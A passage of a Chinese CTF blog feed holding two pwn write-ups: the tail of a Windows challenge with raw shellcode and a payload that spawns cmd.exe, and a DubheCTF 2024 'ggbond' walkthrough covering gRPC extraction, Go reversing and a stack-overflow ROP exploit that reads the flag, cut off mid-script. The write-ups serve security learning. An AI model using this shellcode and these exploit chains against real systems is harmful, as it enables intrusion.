jnz read</span></span><br><span class="line"><span class="string">    call near ptr emmm</span></span><br><span class="line"><span class="string">read:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    sub ax,0x3010</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov eax,0x14121c1</span></span><br><span class="line"><span class="string">    xor eax,ecx</span></span><br><span class="line"><span class="string">    mov ebx,[eax]</span></span><br><span class="line"><span class="string">    call ebx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    jmp ebx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(shellcode)</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\xb9\x01\x01\x01\x01\xb8\xbd!A\x011\xc8\x8b\x181\xc9Q\xff\xd3YP\xb9\x01\x01\x01\x01Q1\xc0PX\x85\xc0u\x05\xe8\xf6\xff\xff\xfff-\x100P\xb8\xc1!A\x011\xc8\x8b\x18\xff\xd3[\xff\xe3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"><span class="keyword">assert</span>(<span class="string">b&#x27;\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shellcode <span class="keyword">and</span> <span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shellcode)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(shellcode) &lt; <span class="number">120</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line">pause()</span><br><span class="line">payload = shellcode.ljust(<span class="number">120</span>,<span class="string">b&#x27;\xAA&#x27;</span>) + <span class="string">b&#x27;\xeb\x86\xAA\xAA&#x27;</span> + p32(pop2) + <span class="string">b&#x27;cmd.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;data:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;\xcc&#x27;</span> + shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者改为</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell = <span class="string">b&#x27;U\x8b\xec\x83\xec SVW\xc7E\xe8u\x00c\x00\xc7E\xecr\x00t\x00f\xc7E\xfccm\xc6E\xfed\xc7E\xe0systf\xc7E\xe4em\xc6E\xe6\x00d\xa10\x00\x00\x00\x83\xc0\x0c\x8b\x00\x89E\xf8\x8b&#125;\xf8\x83\xc7\x14\x8b\x17;\xd7t8\x8dd$\x00\x8br(\x8dM\xe83\xc0+\xf1\x8d\x9b\x00\x00\x00\x00\x8d\x0cFf\x8bL\r\xe8f;LE\xe8u\x06@\x83\xf8\x04|\xeb\x83\xf8\x04\x0f\x84\x82\x00\x00\x00\x8b\x12;\xd7u\xcc\x8b&#125;\xf8\x8bG&lt;3\xf6\x8b\\8x\x8bD;\x1c\x03\xdf\x03\xc7\x89E\xf0\x8bK \x8bC$\x03\xcf\x03\xc7\x89M\xec\x89E\xf49s\x18vI\x8b\x14\xb1\x8dE\xe0\x03\xd73\xc9+\xd0\x8dd$\x00\x8d\x04\x11\x8aD\x05\xe0:D\r\xe0u\x06A\x83\xf9\x06|\xed\x83\xf9\x06u\x18\x8bM\xf0\x8dE\xfcP\x8bE\xf4\x0f\xb7\x04p\x8b\x04\x81\x03\xc7\xff\xd0\x83\xc4\x04\x8bM\xecF;s\x18r\xb7_^[\x8b\xe5]\xc3\x8bz\x10\xeb\x82&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">windows pwn</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="windows" scheme="https://ixout.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>dubhe2024-ggbond复现</title>
    <link href="https://ixout.github.io/posts/33061/"/>
    <id>https://ixout.github.io/posts/33061/</id>
    <published>2024-04-14T13:26:08.000Z</published>
    <updated>2024-04-18T09:11:31.842Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://ywhkkx.github.io/2024/03/21/DubheCTF2024/">DubheCTF2024 | Pwn进你的心 (ywhkkx.github.io)</a></p><p><a href="https://akaieurus.github.io/2024/03/19/天枢ctf-wp/#cvm">2024 DubheCTF pwn wp - Eurus禁止摆烂！ (akaieurus.github.io)</a></p><p><a href="https://starrysky1004.github.io/2024/03/23/xctf-ggbond-fu-xian/xctf-ggbond-fu-xian/">xctf-ggbond复现 | StarrySky (starrysky1004.github.io)</a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>提供的附件如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├── bin</span><br><span class="line">│   ├── ctf.xinetd</span><br><span class="line">│   ├── flag</span><br><span class="line">│   ├── pwn</span><br><span class="line">│   ├── pwn.i64</span><br><span class="line">│   └── start.sh</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── pow.py</span><br></pre></td></tr></table></figure><p>除了二进制文件以及Dockfile部署文件还有一个<code>pow.py</code></p><p><strong>pow.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="comment">#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#</span></span><br><span class="line">    <span class="comment"># The container will be destroyed after 20 seconds </span></span><br><span class="line">    <span class="comment"># or when the &#x27;p&#x27; socket connection is closed.</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># The Docker container challenge&#x27;s internal network cannot </span></span><br><span class="line">    <span class="comment"># connect to the external network.</span></span><br><span class="line"><span class="comment">#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#</span></span><br><span class="line"></span><br><span class="line">remote_ip = <span class="string">&#x27;&#x27;</span></span><br><span class="line">remote_port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    p = remote(remote_ip, remote_port)</span><br><span class="line">    rev = p.recvuntil(<span class="string">b&#x27; == &#x27;</span>).decode()</span><br><span class="line">    pattern = <span class="string">r&#x27;xxxx\+([a-zA-Z0-9]+)&#x27;</span></span><br><span class="line">    rev = re.search(pattern, rev).group(<span class="number">1</span>)</span><br><span class="line">    target_digest = p.recv(<span class="number">64</span>).decode()</span><br><span class="line"></span><br><span class="line">    characters = string.ascii_letters + string.digits</span><br><span class="line">    all_combinations = [<span class="string">&#x27;&#x27;</span>.join(comb) <span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(characters, repeat=<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> comb <span class="keyword">in</span> all_combinations:</span><br><span class="line">        proof = comb+rev</span><br><span class="line">        digest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> target_digest == digest:</span><br><span class="line">            result = comb</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    p.send(result) </span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27; nc &#x27;</span>)</span><br><span class="line">    rev = p.recvline().decode()</span><br><span class="line">    pattern = <span class="string">r&#x27;(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)\s(\d+)&#x27;</span></span><br><span class="line">    result = re.search(pattern, rev)</span><br><span class="line">    target_ip = result.group(<span class="number">1</span>)</span><br><span class="line">    target_port = <span class="built_in">int</span>(result.group(<span class="number">2</span>))</span><br><span class="line">    sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> target_ip, target_port</span><br><span class="line">        </span><br><span class="line">target_ip, target_port=<span class="built_in">pow</span>()</span><br></pre></td></tr></table></figure><p>gpt一下</p><p><code>pow</code>应该是<code>Proof of Work</code>的缩写,PoW 是一种网络协议的机制，用于防止网络滥用，比如防止DDoS攻击和垃圾邮件。在这里，服务器会给客户端一个工作量证明（Proof of Work）的问题，客户端需要解决这个问题才能与服务器建立连接。解决这个问题通常需要一些计算资源和时间，但验证答案很简单。</p><p>这段代码的主要作用是通过解决<code>Proof of Work (PoW)</code>来获取远程服务器指定的下一目标<code>IP</code>地址和端口号,其实我们并不需要多做关注</p><h2 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h2><p>文件夹的名字叫做gRPC,搜索一下</p><blockquote><p><code>RPC (Remote Procedure Call)</code>远程过程调用，<strong>允许一台计算机通过网络调用另一台计算机上的程序或函数</strong>，<code>RPC</code>框架通常负责打包（序列化）请求参数，传输消息，在服务器端解包（反序列化）参数，执行远程过程，并将结果返回给客户端</p></blockquote><p><code>gRPC</code>是由<code>Google</code>开发的现代开源高性能<code>RPC</code>框架，支持多种编程语言。<code>gRPC</code>默认使用<code>Protocol Buffers（protobuf）</code>作为接口定义语言（<code>IDL</code>）和其底层消息交换格式，提供了一种简洁高效的方式来定义服务和生成客户端和服务器代码</p><p><a href="https://zhuanlan.zhihu.com/p/363672930">参考</a></p><h2 id="pbtk"><a href="#pbtk" class="headerlink" title="pbtk"></a>pbtk</h2><p>前面提到gRPC使用protobuf作为接口语言</p><p>于是有一个专门的工具pbtk可以提取<strong><code>Protobuf</code>结构</strong>，将其转换回可替代的<code>.proto</code></p><p>可以使用<code>.gui.py</code>图形化操作</p><p>也可以直接使用<code>pbtk/extractors/from_binary.py</code>脚本</p><p>然后我们可以在分离出的protobuf结构体中找到<code>ggbond.proto</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> GGBond;</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;./;ggbond&quot;</span>;</span><br><span class="line"></span><br><span class="line">service GGBondServer &#123;</span><br><span class="line">    rpc Handler(Request) returns (Response);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Request &#123;</span><br><span class="line">    oneof request &#123;</span><br><span class="line">        WhoamiRequest whoami = <span class="number">100</span>;</span><br><span class="line">        RoleChangeRequest role_change = <span class="number">101</span>;</span><br><span class="line">        RepeaterRequest repeater = <span class="number">102</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Response &#123;</span><br><span class="line">    oneof response &#123;</span><br><span class="line">        WhoamiResponse whoami = <span class="number">200</span>;</span><br><span class="line">        RoleChangeResponse role_change = <span class="number">201</span>;</span><br><span class="line">        RepeaterResponse repeater = <span class="number">202</span>;</span><br><span class="line">        ErrorResponse <span class="type">error</span> = <span class="number">444</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiRequest &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiResponse &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeRequest &#123;</span><br><span class="line">    <span class="type">uint32</span> role = <span class="number">1001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeResponse &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterRequest &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">1002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterResponse &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message ErrorResponse &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">4444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在protobuf中，<code>service</code> 关键字用于定义一个服务，而 <code>rpc</code> 关键字用于定义该服务中的远程过程调用</p><p><code>rpc Handler(Request) returns (Response)</code>：这行代码定义了一个名为 <code>Handler</code> 的远程过程调用。它接收一个 <code>Request</code> 类型的参数，并返回一个 <code>Response</code> 类型的响应。</p><p>其他数据都有定义</p><h2 id="grpc-tools"><a href="#grpc-tools" class="headerlink" title="grpc_tools"></a>grpc_tools</h2><p>我们需要与grpc进程进行交互,那么就需要将上一步中分离出来的proto文件编译为可供python引用的形式</p><p>首先安装<code>grpc_tools</code>:</p><p><code>pip install grpcio-tools</code></p><p><code>grpc_tools</code> 是 Google 开发的一组工具，用于帮助开发者使用 gRPC框架。我们这里安装的是对应python版本的</p><p>然后执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. ggbond.proto</span><br></pre></td></tr></table></figure><p>就会生成<code>ggbond_pb2_grpc.py</code> 、<code>ggbond_pb2.py</code></p><p><code>ggbond_pb2_grpc.py</code>：</p><ul><li><code>ggbond_pb2_grpc.py</code> 包含了根据 <code>.proto</code> 文件生成的 gRPC 客户端和服务器的代码。</li><li><u>这个文件中定义了 gRPC 客户端和服务器的存根（Stub）和服务器（Servicer）类。</u></li><li>客户端使用存根类来发送请求并接收响应，服务器使用服务器类来实现服务方法。</li><li>存根和服务器类中的方法是根据 <code>.proto</code> 文件中定义的服务和远程过程调用（RPC）自动生成的。</li></ul><p><code>ggbond_pb2.py</code>：</p><ul><li><code>ggbond_pb2.py</code> 包含了根据 <code>.proto</code> 文件生成的所有消息类型和相关的数据结构。</li><li>这个文件中定义了 <code>.proto</code> 文件中所描述的所有消息类型，以及消息类型之间的关系。</li><li>在 gRPC 通信中，客户端和服务器都需要使用这些消息类型来构建请求和响应消息。</li></ul><p>来个例子</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 创建 gRPC 通道</span></span><br><span class="line">    channel = grpc.insecure_channel(<span class="string">&#x27;localhost:23334&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建 gRPC 客户端存根</span></span><br><span class="line">    stub = ggbond_pb2_grpc.GGBondServerStub(channel)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造请求消息</span></span><br><span class="line">    request = ggbond_pb2.Request(</span><br><span class="line">        whoami=ggbond_pb2.WhoamiRequest(),  <span class="comment"># 选择要发送的请求类型,whoami对象，值来自构造函数</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用远程过程调用（RPC）</span></span><br><span class="line">    response = stub.Handler(request)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理响应</span></span><br><span class="line">    <span class="keyword">if</span> response.HasField(<span class="string">&#x27;whoami&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received response: &quot;</span>, response.whoami.message)</span><br><span class="line">    <span class="keyword">elif</span> response.HasField(<span class="string">&#x27;error&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error occurred: &quot;</span>, response.error.message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>结果:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; python gRPC_test.py </span><br><span class="line">Received response:  I<span class="string">&#x27;m GGBOND</span></span><br></pre></td></tr></table></figure></p><p>那么整个交互的脚本就可以写出来了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami</span>(<span class="params">chan</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(whoami=ggbond_pb2.WhoamiRequest()))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change</span>(<span class="params">chan,role</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(role_change=ggbond_pb2.RoleChangeRequest(role=role)))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater</span>(<span class="params">chan,message</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(repeater=ggbond_pb2.RepeaterRequest(message=base64.b64encode(message))))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line">    </span><br><span class="line">channel=grpc.insecure_channel(<span class="string">&#x27;localhost:23334&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>之后就是恶心的go逆向了</p><p>这题还是取出了符号的,不过现在有8.3的ida pro可以使用,直接能够恢复符号</p><p>或者没有的话使用AlapaGo插件也行</p><p>在一坨代码中找到了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">google_golang_org_grpc__ptr_Server_RegisterService(v62, &amp;stru_C59860, v65);</span><br></pre></td></tr></table></figure><p>看函数名字像是注册服务器</p><p>跟进,发现其内部使用了第二个参数比较多,而恰好ida又将其识别成了结构体</p><p>跟进看看</p><p>ida将其识别成了<code>grpc_ServiceDesc</code>结构体,在ida中可以找到相关定义,这里直接贴源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ServiceDesc <span class="keyword">struct</span> &#123;</span><br><span class="line">ServiceName <span class="type">string</span></span><br><span class="line"><span class="comment">// The pointer to the service interface. Used to check whether the user</span></span><br><span class="line"><span class="comment">// provided implementation satisfies the interface requirements.</span></span><br><span class="line">HandlerType any</span><br><span class="line">Methods     []MethodDesc</span><br><span class="line">Streams     []StreamDesc</span><br><span class="line">Metadata    any</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MethodDesc <span class="keyword">struct</span> &#123;</span><br><span class="line">MethodName <span class="type">string</span></span><br><span class="line">Handler    methodHandler</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> StreamDesc <span class="keyword">struct</span> &#123;</span><br><span class="line">StreamName <span class="type">string</span>        </span><br><span class="line">Handler    StreamHandler </span><br><span class="line"></span><br><span class="line">ServerStreams <span class="type">bool</span> </span><br><span class="line">ClientStreams <span class="type">bool</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们可以在MethodDesc中找到handler函数</p><p>不过这都是复现时才知道的,实际要发现还是要靠一些观察力,或者直接去搜函数名字筛选</p><p>找到handler函数在<code>7ED300</code></p><p>在这里<code>(*(void (__golang **)(void *, __int64, __int64, ggbond_Request *))(v21 + 24))(a2, v31, a4, p_ggbond_Request);</code>进行了功能调用</p><p>调试跟一下</p><p>发现最终是调用<code>0x7ed860</code>,找到,又是一坨</p><p>最终发现当role为3时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; (__int64)(<span class="number">3</span> * (len &gt;&gt; <span class="number">2</span>)); ++i )</span><br><span class="line">&#123;</span><br><span class="line">  *(_BYTE *)v50 = *v51;</span><br><span class="line">  v50 = (__int128 *)((<span class="type">char</span> *)v50 + <span class="number">1</span>);</span><br><span class="line">  ++v51;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>repeater可以往栈上写无限制数据(<u>go题最后果然都是栈溢出</u>)</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami</span>(<span class="params">chan</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(whoami=ggbond_pb2.WhoamiRequest()))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change</span>(<span class="params">chan,role</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(role_change=ggbond_pb2.RoleChangeRequest(role=role)))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater</span>(<span class="params">chan,message</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(repeater=ggbond_pb2.RepeaterRequest(message=base64.b64encode(message))))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">23334</span>)</span><br><span class="line">channel=grpc.insecure_channel(<span class="string">&#x27;localhost:23334&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(role_change(channel,<span class="number">3</span>))</span><br><span class="line">rdi_addr=<span class="number">0x401537</span></span><br><span class="line">rsi_addr=<span class="number">0x422398</span></span><br><span class="line">rdx_addr=<span class="number">0x461bd1</span></span><br><span class="line">rax_addr=<span class="number">0x4101e6</span></span><br><span class="line">syscall_addr=<span class="number">0x40452C</span></span><br><span class="line">flag_addr=<span class="number">0x7FAEEC</span></span><br><span class="line">bss_addr=<span class="number">0xC90000</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc8</span></span><br><span class="line">payload+=p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(rdx_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rax_addr)+p64(<span class="number">2</span>)+p64(syscall_addr)</span><br><span class="line">payload+=p64(rdi_addr)+p64(<span class="number">9</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(rax_addr)+p64(<span class="number">0</span>)+p64(syscall_addr)</span><br><span class="line">payload+=p64(rdi_addr)+p64(<span class="number">7</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="number">0x30</span>)<span class="comment">#7是通过遍历找到的socket fd</span></span><br><span class="line">payload+=p64(rax_addr)+p64(<span class="number">1</span>)+p64(syscall_addr)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span 